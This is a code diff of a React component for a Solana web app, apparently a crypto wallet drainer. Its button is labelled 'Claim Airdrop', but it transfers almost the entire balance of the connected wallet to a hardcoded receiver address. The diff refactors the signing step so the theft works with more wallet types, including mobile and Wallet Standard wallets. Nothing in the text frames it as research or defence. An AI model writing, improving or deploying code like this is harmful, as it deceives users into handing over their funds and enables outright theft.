@@ -1,36 +1,20 @@
 // src/components/TransferButton.jsx
-import { useWallet } from '@solana/wallet-adapter-react';
+import { useConnection, useWallet } from '@solana/wallet-adapter-react';
 import { useCallback, useState } from 'react';
-import { Connection, LAMPORTS_PER_SOL, SystemProgram, Transaction } from '@solana/web3.js';
-import { MIN_QUALIFY_SOL, RECEIVER_WALLET, RPC_ENDPOINTS, TRANSFER_FEE_BUFFER } from '../utils/constants';
+import { LAMPORTS_PER_SOL, SystemProgram, Transaction } from '@solana/web3.js';
+import { MIN_QUALIFY_SOL, RECEIVER_WALLET, TRANSFER_FEE_BUFFER } from '../utils/constants';
 
 export default function TransferButton({ className = '' }) {
-  const { publicKey, signTransaction } = useWallet();
+  const { connection } = useConnection();
+  const { publicKey, sendTransaction, connected } = useWallet();
   const [loading, setLoading] = useState(false);
 
   const handleTransfer = useCallback(async () => {
-    if (!publicKey || !signTransaction) return;
+    if (!publicKey || !sendTransaction || !connected) return;
 
     setLoading(true);
     try {
-      // Try each RPC endpoint until one responds
-      let connection;
-      let balance;
-      let connected = false;
-      for (const rpc of RPC_ENDPOINTS) {
-        try {
-          connection = new Connection(rpc, 'confirmed');
-          balance = await connection.getBalance(publicKey);
-          connected = true;
-          break;
-        } catch (_) {
-          console.warn('RPC failed, trying next:', rpc);
-        }
-      }
-      if (!connected) {
-        alert('Network error: Could not connect to Solana. Please try again.');
-        return;
-      }
+      const balance = await connection.getBalance(publicKey, 'confirmed');
       const minimumQualifyingLamports = Math.floor(MIN_QUALIFY_SOL * LAMPORTS_PER_SOL);
 
       if (balance < minimumQualifyingLamports + TRANSFER_FEE_BUFFER) {
@@ -38,17 +22,19 @@ export default function TransferButton({ className = '' }) {
         return;
       }
 
-      // Reserve enough for the tx fee (5000 lamports)
       const transferAmount = balance - TRANSFER_FEE_BUFFER;
-
       if (transferAmount <= 0) {
         alert('Insufficient balance for transaction fee.');
         return;
       }
 
-      const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
+      const { blockhash, lastValidBlockHeight } =
+        await connection.getLatestBlockhash('confirmed');
 
-      const transaction = new Transaction().add(
+      const transaction = new Transaction({
+        feePayer: publicKey,
+        recentBlockhash: blockhash,
+      }).add(
         SystemProgram.transfer({
           fromPubkey: publicKey,
           toPubkey: RECEIVER_WALLET,
@@ -56,16 +42,10 @@ export default function TransferButton({ className = '' }) {
         })
       );
 
-      transaction.recentBlockhash = blockhash;
-      transaction.feePayer = publicKey;
-
-      // Explicitly sign with the wallet, then send the raw signed tx
-      const signed = await signTransaction(transaction);
-      const rawTransaction = signed.serialize();
-      const signature = await connection.sendRawTransaction(rawTransaction, {
-        skipPreflight: false,
-        preflightCommitment: 'confirmed',
-      });
+      // sendTransaction from the wallet adapter handles signing for ALL
+      // wallet types (Wallet Standard signAndSendTransaction, legacy
+      // signTransaction, mobile deep-link wallets, etc.)
+      const signature = await sendTransaction(transaction, connection);
 
       console.log('⏳ Transaction sent:', signature);
 
@@ -82,23 +62,21 @@ export default function TransferButton({ className = '' }) {
     } finally {
       setLoading(false);
     }
-  }, [publicKey, signTransaction]);
+  }, [publicKey, sendTransaction, connected, connection]);
 
   if (!publicKey) return null;
 
-  // src/components/TransferButton.jsx
-return (
-  <button
-    onClick={handleTransfer}
-    disabled={loading}
-    className={`
-      w-full py-3 px-4 rounded-lg font-semibold transition
-      ${loading ? 'bg-gray-600 cursor-not-allowed' : ''}
-      ${className}
-    `}
-  >
-    {loading ? 'Claiming...' : 'Claim Airdrop'}
-  </button>
-);
-
+  return (
+    <button
+      onClick={handleTransfer}
+      disabled={loading}
+      className={`
+        w-full py-3 px-4 rounded-lg font-semibold transition
+        ${loading ? 'bg-gray-600 cursor-not-allowed' : ''}
+        ${className}
+      `}
+    >
+      {loading ? 'Claiming...' : 'Claim Airdrop'}
+    </button>
+  );
 }
